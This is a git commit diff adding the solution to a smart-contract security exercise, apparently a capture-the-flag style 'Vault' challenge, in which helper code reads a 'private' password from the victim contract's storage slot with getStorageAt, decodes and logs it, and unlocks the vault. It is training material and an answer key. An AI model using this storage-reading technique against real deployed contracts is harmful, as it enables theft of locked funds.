54a06ce4cf39b158cb8f1f35d6b5a61f4a484e43
Kai <krikhye@gmail.com>
2022-06-08 10:43:39 -0400

    vault: add solution

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -2,12 +2,11 @@ import { expect } from "chai";
 import { ethers, waffle } from "hardhat";
 
 const helper = async (victim: any) => {
-  /* 
-    Add code here that will help you pass the test
-    Note: Unlock without using the string "A very strong password"
-    Unlock the vault by somehow reading the private password from 
-    Vault directly
-  */
+  const provider = waffle.provider;
+  const passwordBytes = await provider.getStorageAt(victim.address, 1);
+  const passwordText = ethers.utils.parseBytes32String(passwordBytes);
+  console.log("Password text: " + passwordText);
+  await victim.unlock(passwordBytes);
 };
 
 export default helper;
